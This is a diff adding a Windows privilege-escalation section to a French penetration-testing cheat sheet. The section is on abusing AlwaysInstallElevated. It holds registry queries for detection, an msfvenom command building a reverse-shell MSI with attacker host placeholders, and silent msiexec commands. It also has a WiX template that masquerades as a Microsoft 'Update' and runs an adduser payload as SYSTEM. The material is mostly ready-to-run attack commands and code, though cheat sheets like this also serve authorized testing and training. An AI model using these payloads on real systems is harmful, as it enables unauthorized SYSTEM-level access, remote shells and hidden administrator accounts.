@@ -465,6 +465,7 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 
 ```bash
 # Kali : compiler et servir
+sudo apt install g++-mingw-w64-x86-64
 x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
 python3 -m http.server 80
 ```
@@ -823,3 +824,64 @@ SQL> EXEC xp_cmdshell 'whoami';
 
 ## LaZagne
 https://github.com/AlessandroZ/LaZagne
+
+## AlwaysInstallElevated
+
+### Détection
+Vérifier les deux clés de registre :
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+```powershell
+Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
+Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+Les deux doivent retourner `0x1` pour que la vulnérabilité soit exploitable.
+
+### Exploitation via RevShell
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
+```
+
+```cmd
+msiexec /quiet /qn /i evil.msi
+```
+
+### Exploitation via adduser
+
+```bash
+sudo apt install wixl
+```
+
+**adduser.wxs**
+```xml
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="Update" Version="1.0.0" Manufacturer="MS" Language="1033">
+    <Package InstallerVersion="200" Compressed="yes"/>
+    <MediaTemplate EmbedCab="yes"/>
+    <Feature Id="Main"><ComponentGroupRef Id="Files"/></Feature>
+    <ComponentGroup Id="Files" Directory="TARGETDIR">
+      <Component Id="MainComponent" Guid="12345678-1234-1234-1234-123456789012">
+        <File Id="adduser.exe" Source="adduser.exe"/>
+      </Component>
+    </ComponentGroup>
+    <CustomAction Id="Run" FileKey="adduser.exe" ExeCommand="" Execute="deferred" Impersonate="no"/>
+    <InstallExecuteSequence>
+      <Custom Action="Run" After="InstallFiles"/>
+    </InstallExecuteSequence>
+  </Product>
+  <Fragment><Directory Id="TARGETDIR" Name="SourceDir"/></Fragment>
+</Wix>
+```
+
+```bash
+wixl -o adduser.msi adduser.wxs
+```
+
+```cmd
+msiexec /quiet /qn /i adduser.msi
+```
